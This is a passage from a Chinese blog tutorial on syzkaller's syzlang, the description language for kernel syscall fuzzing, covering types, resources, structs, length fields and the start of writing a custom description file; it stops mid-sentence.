<strong>intptr</strong>：一个有着特殊含义的整型，下文会进行详细说明</p><ul><li>类型选项：<ul><li>可选范围区间：例如 <code>&quot;1:100&quot;</code> 表示取值值的区间为 <code>[1, 100]</code></li><li>可选参数</li></ul></li></ul></li><li><p><strong>flags</strong>：值的集合</p><ul><li>类型选项：<ul><li>对 flags 描述的引用</li><li>基础整型类型：例如 <code>int32</code></li></ul></li></ul></li><li><p><strong>array</strong>：一个可变长&#x2F;固定长度的数组</p><ul><li>类型选项：<ul><li>元素的 type</li><li>可选长度区间：例如固定长度 <code>&quot;5&quot;</code> 或者长度范围 <code>&quot;5:10&quot;</code>（包括边界）</li></ul></li></ul></li><li><p><strong>ptr</strong> 或 <strong>ptr64</strong>：指向一个对象的指针</p><ul><li>类型选项：<ul><li>方向：<code>in</code> 或 <code>out</code> 或 <code>inout</code></li><li>对象的 type</li></ul></li><li>无论对象指针大小如何，ptr64 永远为 8 字节</li></ul></li><li><p><strong>string</strong>：一块有着 0 终止符的内存缓冲区</p><ul><li>类型选项：<ul><li>常量字符串&#x2F;对字符串的引用<ul><li>前者：例如 <code>&quot;foo&quot;</code>作为常规字符串进行解析，或者`deadbeef`作为4个 16 进制字节进行解析</li><li>后者：若是特殊类型 <code>filename</code> 则会<strong>生成</strong>文件名</li></ul></li></ul></li></ul></li><li><p><strong>stringnoz</strong>：一块<strong>没有</strong> 0 终止符的内存缓冲区</p><ul><li>类型选项：（同 <code>string</code>)</li></ul></li><li><p><strong>glob</strong>：匹配目标文件的 glob（？）模式</p><ul><li>类型选项：<ul><li>用引号包裹着的模式字符串：例如 <code>&quot;/sys/&quot;</code> 或 <code>&quot;/sys/**/*/&quot;</code>，具体用法参见<a href="https://pkg.go.dev/path/filepath#Match">https://pkg.go.dev/path/filepath#Match</a></li></ul></li></ul></li><li><p><strong>fmt</strong>：一个表示一个整数的字符串</p><ul><li>类型选项：<ul><li>格式与值：前者可取值为 <code>dec</code>或  <code>hex</code> 或 <code>oct</code>；后者可以是一个 resource、int、flags、const 或 proc</li></ul></li><li>最终的结果通常是固定尺寸的</li></ul></li><li><p><strong>len</strong>：另一个 <code> 字段</code> 的长度（对于 array 而言为元素的数量）</p><ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><p><strong>bytesize</strong>：与 len 类似，不过单位是<strong>字节</strong></p><ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><p><strong>bitsize</strong>：与 len 类型，不过单位是<strong>比特位</strong></p><ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><p><strong>offsetof</strong>：一个 <code>字段</code> 在其 parent struct  中的偏移（笔者怎么译都没那感觉，故保留原词）</p><ul><li>类型选项：<ul><li><code>字段</code></li></ul></li></ul></li><li><p><strong>vma</strong> 或 <strong>vma64</strong>：指向一组页的指针（用作 mmap&#x2F;munmap&#x2F;mremap&#x2F;madvise 的输入）</p><ul><li>类型选项：<ul><li>（可选）页的数量或页的范围：前者例如 <code>vma[7]</code>，后者例如 <code>vma[2-4]</code></li></ul></li><li>vma64 的长度恒为 8 字节</li></ul></li><li><p><strong>proc</strong>：单个进程的整型（详见下面的描述）</p><ul><li>类型选项：<ul><li>值的区间的起始</li><li>每个进程的值的数量</li><li>基础类型</li></ul></li></ul></li><li><p><strong>text</strong>：特定 type 的机器码</p><ul><li>类型选项：<ul><li>代码类型：<code>x86_real</code>, <code>x86_16</code>, <code>x86_32</code>, <code>x86_64</code>, <code>arm64</code></li></ul></li></ul></li><li><p><strong>void</strong>：type with static size 0（自己体会，怎么译都没那种感觉…）</p><ul><li>通常在模板以及可变长（varlen）联合体中使用，<strong>不能用作系统调用的参数</strong></li></ul></li></ul><p>在 <code>结构体/联合体/指针</code> 中使用时，<code>flags/len/flags</code> 的构成中尾部还可以跟着 type type-options</p><blockquote><p><del>唉呀你说了这么多谁听得懂啊，还是快把🌰搬上来吧</del></p></blockquote><h5 id="关于-flags-的补充说明"><a href="#关于-flags-的补充说明" class="headerlink" title="关于 flags 的补充说明"></a>关于 <em>flags</em> 的补充说明</h5><p>flags 通常具有如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">flagname = const [&quot;,&quot; const]*<br></code></pre></td></tr></table></figure><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">my_flags = 1,2,3,4,5,6,7,8,9,0<br></code></pre></td></tr></table></figure><p>对于 string 类型的 flag，其应当具有如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">flagname = &quot;\&quot;&quot; literal &quot;\&quot;&quot; [&quot;,&quot; &quot;\&quot;&quot; literal &quot;\&quot;&quot;]*<br></code></pre></td></tr></table></figure><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">my_str_flags = &quot;arttnba3&quot;, &quot;arttnba4&quot;, &quot;arttnba5&quot;<br></code></pre></td></tr></table></figure><h4 id="类型选项（type-options）"><a href="#类型选项（type-options）" class="headerlink" title="类型选项（type-options）"></a>类型选项（type-options）</h4><blockquote><p>在类型当中，类型选项其实也是可选项（<del>又搁这绕口令了</del>）</p></blockquote><p>type-options 在笔者的理解中为<strong>对一个特定 type 的补充说明</strong>，其应当具有如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">type-options = [type-opt [&quot;,&quot; type-opt]]<br></code></pre></td></tr></table></figure><p>我们不难看出 type-options 在 syzlang 中为<strong>可选项</strong>，同样地，对于一个 type 其可以有多个 type-options</p><p>查看前面 type 的形式说明可知，在使用类型选项时，我们应当使用 <code>[]</code> 将之包裹</p><p>以下是一个简单的🌰（作为系统调用参数输入，而非单独的参数定义）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">flags flags[open_flags]<br></code></pre></td></tr></table></figure><p>从左向右解析：对于这个系统调用的 <code>flags</code> 参数，我们的输入是一个 flags 类型，其类型选项为对一个 flags 描述 <code>open_flags</code> 的引用，意为取值为 open_flags 中之一</p><p>其中 open_flags 被定义如下，这些值通过 include 语句从内核源文件中被包含进来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE<br></code></pre></td></tr></table></figure><h3 id="III-系统调用模板"><a href="#III-系统调用模板" class="headerlink" title="III.系统调用模板"></a>III.系统调用模板</h3><p>我们将上面的结果进行整合，一个系统调用的形式应当如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">syscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]<br></code></pre></td></tr></table></figure><p>接下来笔者通过一个🌰进行分解说明</p><h4 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h4><p>我们将其最小化，我们应当书写为如下形式，类似于常规的 C 语言函数调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">syscallname(arg)<br></code></pre></td></tr></table></figure><p>例如对于 open 这个系统调用，我们可以写成这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode])<br>#...<br>open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE<br>open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH<br></code></pre></td></tr></table></figure><p>对于 open 系统调用的三个参数，我们给了这样的输入：</p><ul><li>file 参数：一个<strong>指针</strong>类型，其 type-opetions 的第一个为 <code>in</code>，意为由该指针指向特定对象，第二个为 <code>filename</code>，为<strong>特殊的 string 对象</strong>，对于 filename，syzlang 会进行文件生成，将文件名作为输入</li><li>flags 参数：一个 <strong>flags</strong> 类型，其 type-options 为 <code>open_flags</code> ，意为从我们定义的 flags——<code>open_flags</code> 中取值</li><li>mode 参数：一个 <strong>flags</strong> 类型，其 type-options 为 <code>open_mode</code> ，意为从我们定义的 flags——<code>open_mode</code> 中取值</li></ul><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>接下来我们再继续深入，系统调用通常都有返回值，我们可以选择接收也可以选择忽视，若是我们需要进行接收，则应当在系统调用的末尾添加 type ，例如 open 这个系统调用会返回一个文件描述符，我们现在想将其返回的文件描述符存到一个变量比如说 <code>a3fd</code>（假如已被声明为 _资源_（下文解释）） 当中，我们应当写成下面这个形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) a3fd<br></code></pre></td></tr></table></figure><p>那么 open 的返回值便被存储到了 <code>a3fd</code> 这一个 type 当中，我们在后续便可以将 fd 用作其他系统调用的参数，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">close(fd a3fd)<br></code></pre></td></tr></table></figure><h4 id="call-attributes"><a href="#call-attributes" class="headerlink" title="call attributes"></a>call attributes</h4><p>系统调用模板当中还有一个可选项是 <code>attributes</code>，即这一个系统调用的<strong>属性</strong>，可以取的值如下：</p><ul><li><code>disabled</code>：该系统调用将不用于 fuzzing；这个属性通常用于临时禁用某些系统调用，或者禁用特定的参数组合</li><li><code>timeout[N]</code>：系统调用在默认值以外的额外的超时时间，单位为毫秒（ms）</li><li><code>prog_timeoout[N]</code>：若一个程序包含了该系统调用，则该属性为整个程序的执行的超时时间，若存在多个定义了该属性的系统调用则取最大值</li><li><code>ignore_return</code>：在回退反馈（笔者推指的是 syzkaller 的 fuzz 机制之一，根据返回值判断路径覆盖之类的）中忽视这个系统调用的返回值；用于不返回固定的错误码（例如 -EFAULT）而是返回其他值的系统调用</li><li><code>break_returns</code>：忽略回退反馈中程序中所有后续系统调用的返回值（文档中说 <code>can&#39;t be trusted</code>，笔者暂时不理解…）</li></ul><h4 id="变种（variants）"><a href="#变种（variants）" class="headerlink" title="变种（variants）"></a>变种（variants）</h4><p>对于系统调用的变种形式，我们应当在系统调用名后面使用 <code>$</code> 符号进行额外的指定</p><p>下面是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">open$dir(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) fd_dir<br></code></pre></td></tr></table></figure><blockquote><p>按笔者的理解应该是为其取一个别名？比如说对于 syzkaller 而言 <code>open$dir</code> 和 <code>open$a3dir</code> 就是两个东西，而若是在两个不同的文件中都出现了 <code>open$dir</code> 则会在_重编译_（下文解释）时发生冲突</p></blockquote><h3 id="IV-整型（integer）"><a href="#IV-整型（integer）" class="headerlink" title="IV.整型（integer）"></a>IV.整型（integer）</h3><p>整型也是一种 type，其可选项为 <code>int8</code> 、<code>int16</code>、<code>int32</code>、<code>int64</code>，表示相应大小的整型</p><p><code>intptr</code> 用以表示一个<strong>指针大小</strong>的整型，对应 C 语言中的 <code>long</code></p><p>通过添加 <code>be</code> 后缀表示这个整型存储为<strong>大端序</strong></p><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">read$eventfd(fd fd_event, val ptr[out, int64], len len[val])<br></code></pre></td></tr></table></figure><p>我们可以用这样的形式来指定 int 的范围：<code>int32[0:100]</code>——意为该整型的取值范围为 <code>[0,100]</code></p><p>我们还可以额外指定取值的跨度，例如 <code>int32[1:10, 2]</code> 意为其取值为 {1, 3, 5, 7, 9}</p><p>我们还可以额外指定一个整型的取值范围，单位为比特位，例如 <code>int64:20</code> 意为这个整型只取其 20 bit 的值进行随机化</p><h3 id="V-结构体、联合体与其成员（字段）"><a href="#V-结构体、联合体与其成员（字段）" class="headerlink" title="V.结构体、联合体与其成员（字段）"></a>V.结构体、联合体与其成员（字段）</h3><p>在 syzlang 中同样可以定义结构体&#x2F;联合体，结构体&#x2F;联合体的成员被称之为 <code>字段</code>（field）</p><h4 id="结构体（struct）"><a href="#结构体（struct）" class="headerlink" title="结构体（struct）"></a>结构体（struct）</h4><p>在 syzlang 中，一个结构体应为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">structname &quot;&#123;&quot; &quot;\n&quot;<br>(fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\n&quot;)+<br>&quot;&#125;&quot; (&quot;[&quot; attribute* &quot;]&quot;)?<br></code></pre></td></tr></table></figure><p>对于字段而言，其可以在后面的 <code>()</code> 中指定字段属性，但与 type 的属性不同，唯一的属性只有方向： <code>in/out/inout</code>，对于指定的字段，其方向属性会被上层属性给覆盖</p><p>在结构体定义的尾部，我们可以额外指定一些属性（使用 <code>[]</code> 包裹），可选属性有：</p><ul><li><code>packed</code>：该结构体不同字段之间没有 padding（例如 C 中有一个结构体 <code>struct T&#123;int a; char b;&#125;;</code>，char 为 1 字节，int 为 4 字节，那么该结构体便会对 4 字节对齐，在其两个字段之间就会有 3 字节的 padding）</li><li><code>align[N]</code>：指定该结构体对 N 字节对齐，padding 的内容并未指定（通常为0）</li><li><code>size[N]</code>：结构体被填充到指定的大小 <code>N</code></li></ul><p>其实和我们在 C 语言中写结构体差不多，下面是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">my_struct &#123;<br>a3f1 int8# 一个随机的 1 字节的 int<br>a3f2const[0xdeadbeef, int32be]# 一个固定的 8 字节的 int，取值为 0xdeadbeef，大端序<br>a3f3int32[0:100]# 一个随机的 4 字节的 int，取值范围为 [0,100]<br>a3f4int64:20# 一个随机的 8 字节的 int，只取20个比特的值（其他bit置0？）<br>&#125; [packed]<br></code></pre></td></tr></table></figure><h4 id="联合体（union）"><a href="#联合体（union）" class="headerlink" title="联合体（union）"></a>联合体（union）</h4><p>与结构体基本相同，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">unionname &quot;[&quot; &quot;\n&quot;<br>(fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\n&quot;)+<br>&quot;]&quot; (&quot;[&quot; attribute* &quot;]&quot;)?<br></code></pre></td></tr></table></figure><p>不同的是其属性的可选项，有：</p><ul><li><code>varlen</code>：联合体的大小可变（为指定的字段的长度），若未指定则该联合体大小为其最大字段的大小（类型 C 语言）</li><li><code>size[N]</code>：该联合体被填充到指定的大小 <code>N</code></li></ul><h3 id="VI-资源（resources）"><a href="#VI-资源（resources）" class="headerlink" title="VI.资源（resources）"></a>VI.资源（resources）</h3><p>资源（resources）用作那些需要作为一个系统调用的输出的值传递给另一个系统调用做输入的值。</p><p>这么说可能有些空泛，笔者来举个🌰， <code>close</code> 系统调用接收一个文件描述符作为参数，而这个文件描述符应当为你在之前进行 <code>open </code> 或 <code>pipe</code> 系统调用时获得的返回值，为了达成这个目的，我们需要将文件描述符（比如说叫 <code>fd</code>）声明为一个<strong>资源</strong></p><p>resources 的形式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">&quot;resource&quot; identifier &quot;[&quot; underlying_type &quot;]&quot; [ &quot;:&quot; const (&quot;,&quot; const)* ]<br></code></pre></td></tr></table></figure><p>其中的 <code>underlying_type</code> 可以是 <code>int8</code>, <code>int16</code>, <code>int32</code>, <code>int64</code>, <code>intptr</code> 或者是另一个资源（可以是其子类，比如说一个 socket 便是 文件描述符的“子类”）</p><p>常量集合可以作为可选参数，表示该资源的特殊值（比如说 0xdeadbeef），特殊值偶尔被用作资源的值，若未指定特殊值，则会使用特殊值 <code>0</code></p><p>资源也可以被用作类型（types），这是官方给出的一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">resource fd[int32]: 0xffffffffffffffff, AT_FDCWD, 1000000<br>resource sock[fd]# 继承 fd 类型<br>resource sock_unix[sock]# 继承 sock 类型<br><br>socket(...) sock<br>accept(fd sock, ...) sock<br>listen(fd sock, backlog int32)<br></code></pre></td></tr></table></figure><p>资源<strong>并不一定要是系统调用的返回值</strong>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">resource my_resource[int32]<br><br>request_producer(..., arg ptr[out, my_resource])<br>request_consumer(..., arg ptr[inout, test_struct])<br><br>test_struct &#123;<br>...<br>attrmy_resource<br>&#125;<br></code></pre></td></tr></table></figure><p>对于更为复杂的生产者&#x2F;消费者场景，字段属性也可以被利用，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">resource my_resource_1[int32]<br>resource my_resource_2[int32]<br><br>request_produce1_consume2(..., arg ptr[inout, test_struct])<br><br>test_struct &#123;<br>...<br>field0my_resource_1(out)<br>field1my_resource_2(in)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="VII-类型别名（Type-Alias）"><a href="#VII-类型别名（Type-Alias）" class="headerlink" title="VII.类型别名（Type Alias）"></a>VII.类型别名（Type Alias）</h3><p>笔者认为可以理解为 C 中的一种特殊的 typedef，其格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">type identifier underlying_type<br></code></pre></td></tr></table></figure><p>这么看可能有些空泛，我们来看一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">type bool8int8[0:1]<br>type bool16int16[0:1]<br>type bool32int32[0:1]<br>type bool64int64[0:1]<br>type boolptrintptr[0:1]<br><br>type fileoff[BASE] BASE<br><br>type filename string[filename]<br><br>type buffer[DIR] ptr[DIR, array[int8]]<br></code></pre></td></tr></table></figure><p>在这个例子当中我们需要使用布尔值，其取值只有 0 或 1 ，所以我们需要写成 <code>intN[0:1]</code>，但是若是在每一个需要用到布尔值的地方都这么写就太麻烦了，也不利于理解，这个时候就可以给他定义一个<strong>类型别名</strong> <code>boolN</code>，简单易懂</p><h3 id="VIII-类型模板（Type-Template）"><a href="#VIII-类型模板（Type-Template）" class="headerlink" title="VIII.类型模板（Type Template）"></a>VIII.类型模板（Type Template）</h3><p>类型模板应定义为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">type optional[T] [<br>valT<br>voidvoid<br>] [varlen]<br></code></pre></td></tr></table></figure><p><del>唉呀谷歌你这么讲谁能够看得懂啊，还是赶紧把🌰给掏出来吧</del></p><p>下面是一个简单的用法🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">type buffer[DIR] ptr[DIR, array[int8]]<br>type fileoff[BASE] BASE<br>type nlattr[TYPE, PAYLOAD] &#123;<br>nla_lenlen[parent, int16]<br>nla_typeconst[TYPE, int16]<br>payloadPAYLOAD<br>&#125; [align_4]<br><br>#...<br><br>syscall(a buffer[in], b fileoff[int64], c ptr[in, nlattr[FOO, int32]])<br></code></pre></td></tr></table></figure><p><del>笔者也没看明白，暂时就先不误人子弟了</del></p><h3 id="IX-长度（length）"><a href="#IX-长度（length）" class="headerlink" title="IX.长度（length）"></a>IX.长度（length）</h3><p>你可以使用关键字 <code>len</code>、<code>bytesize</code>、<code>bitsize</code> 来指定结构体当中特定字段的长度</p><p>若是 <code>len</code> 的参数为一个指针，则其取值为<strong>指针所指对象的大小</strong></p><p>若要表示一个 <code>N 字节的字</code> 中字段的长度，则应当使用 <code>bytesizeN</code>，其中 N 的取值可以为 1、2、4、8</p><h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a><em>example</em></h4><p>这是谷歌官方给出的一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">write(fd fd, buf ptr[in, array[int8]], count len[buf])<br><br>sock_fprog &#123;<br>lenlen[filter, int16]<br>filterptr[in, array[sock_filter]]<br>&#125;<br></code></pre></td></tr></table></figure><p>在 write 系统调用当中，我们给其 count 参数传入了一个特殊的参数 <code>len[buf]</code>，表示此处传入的值为参数 buf 的长度</p><p>在 sock_fprog 这个结构体当中，我们给其字段 len 设置的值为其 filter 字段的长度，类型为 int 16</p><p>若要表示父类的长度，可以使用 <code>len[parent, intN]</code>，若要在结构体互相嵌入时表示更顶层的父类的长度，可以指定特定父类的类型名称，下面是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">s1 &#123;<br>    f0      len[s2]  # length of s2<br>&#125;<br><br>s2 &#123;<br>    f0      s1<br>    f1      array[int32]<br>    f2      len[parent, int32]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>len 也支持更加复杂的路径寻址，比如说如果你闲着没事干你可以写成谷歌给出的这个🌰里的样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">s1 &#123;<br>aptr[in, s2]<br>bptr[in, s3]<br>carray[int8]<br>&#125;<br><br>s2 &#123;<br>darray[int8]<br>&#125;<br><br>s3 &#123;<br># This refers to the array c in the parent s1.<br>elen[s1:c, int32]<br># This refers to the array d in the sibling s2.<br>flen[s1:a:d, int32]<br># This refers to the array k in the child s4.<br>glen[i:j, int32]<br># This refers to syscall argument l.<br>hlen[syscall:l, int32]<br>iptr[in, s4]<br>&#125;<br><br>s4 &#123;<br>jarray[int8]<br>&#125;<br><br>foo(k ptr[in, s1], l ptr[in, array[int8]])<br><br></code></pre></td></tr></table></figure><h3 id="X-进程（proc）"><a href="#X-进程（proc）" class="headerlink" title="X.进程（proc）"></a>X.进程（proc）</h3><p>进程 <code>proc</code> 类型可以用于表示分进程整型值，即为每一个执行程序设置一个单独的值的范围，这样他们之间就不会互相干扰，🌰如端口号就不能够被共享，而是需要每个进程有一个自己的端口</p><p>这里举一个简单的🌰， <code>proc[20000, 4, int16be]</code> 表示为每个进程生成一个大端序的 int16 的值，为每个进程分配其中的 4 个值，从 20000 开始分配，比如说第 N 个 executor 分配到的值范围便是 <code>[20000 + n * 4, 20000 + (n + 1) * 4)</code></p><h3 id="XI-整型常量（Integer-Constants）"><a href="#XI-整型常量（Integer-Constants）" class="headerlink" title="XI.整型常量（Integer Constants）"></a>XI.整型常量（Integer Constants）</h3><p>整型常量可以指定为十进制、<code>0x</code> 开头的十六进制、用单引号 <code>&#39;</code> 包裹的字符，或者从内核头文件中提取出来的由 <code>define</code> 定义的常量（比如说 <code>O_RDONLY</code>）</p><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">foo(a const[10], b const[-10])<br>foo(a const[0xabcd])<br>foo(a int8[&#x27;a&#x27;:&#x27;z&#x27;])<br>foo(a const[PATH_MAX])<br>foo(a ptr[in, array[int8, MY_PATH_MAX]])<br>define MY_PATH_MAXPATH_MAX + 2<br></code></pre></td></tr></table></figure><h3 id="XII-杂项（Misc）"><a href="#XII-杂项（Misc）" class="headerlink" title="XII.杂项（Misc）"></a>XII.杂项（Misc）</h3><p>描述文件还包括用以进行内核头文件包含的 <code>include</code> 指令，用以包含内核头文件目录的 <code>incdir</code> 指令，以及用以设置常量的 <code>define</code> 指令</p><p>syzkaller executor 还定义了一些 <a href="https://github.com/google/syzkaller/blob/master/docs/pseudo_syscalls.md">pseudo system calls</a> ，我们可以在描述文件中使用这些伪系统调用。这些伪系统调用被扩展为 C 代码，可以执行用户自定义的一些操作，<a href="https://github.com/google/syzkaller/blob/master/executor/common_linux.h">这里</a>是一些🌰</p><p>要写出优秀的描述文件，<a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md#tips">这里</a>是一些 tips</p><h2 id="编写并使用描述文件"><a href="#编写并使用描述文件" class="headerlink" title="编写并使用描述文件"></a>编写并使用描述文件</h2><h3 id="Step-I-编写描述文件"><a href="#Step-I-编写描述文件" class="headerlink" title="Step I.编写描述文件"></a>Step I.编写描述文件</h3><p>我们需要在 syzkaller 目录下的 <code>syzkaller/sys/linux/</code> 这个目录下面新建我们自己的描述文件，比如说笔者新建一个 <code>a3_handsome.txt</code> 文件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">include &lt;linux/fs.h&gt;<br><br>resource a3fd[int64]<br><br>open$a3proc(file ptr[in, string[&quot;/dev/tty&quot;]], flags flags[a3_open_flags]) a3fd<br>read$a3proc(fd a3fd, buf ptr[in, array[int8]], count len[buf])<br>write$a3proc(fd a3fd, buf ptr[in, array[int8]], count len[buf])<br>close$a3proc(fd a3fd)<br><br>a3_open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE<br></code></pre></td></tr></table></figure><blockquote><p>随便写的，没有任何的针对性设计</p></blockquote><p>在这里变种名为 <code>a3proc</code>，可以理解为笔者自己取的别名，这是因为若不同的描述文件中存在相同的系统调用则编译时会发生冲突</p><h3 id="Step-II-编译-syz-extract-与-syz-sysgen"><a href="#Step-II-编译-syz-extract-与-syz-sysgen" class="headerlink" title="Step II.编译 syz-extract 与 syz-sysgen"></a>Step II.编译 syz-extract 与 syz-sysgen</h3><p>接下来我们需要编译 <code>syz-extract</code> 与 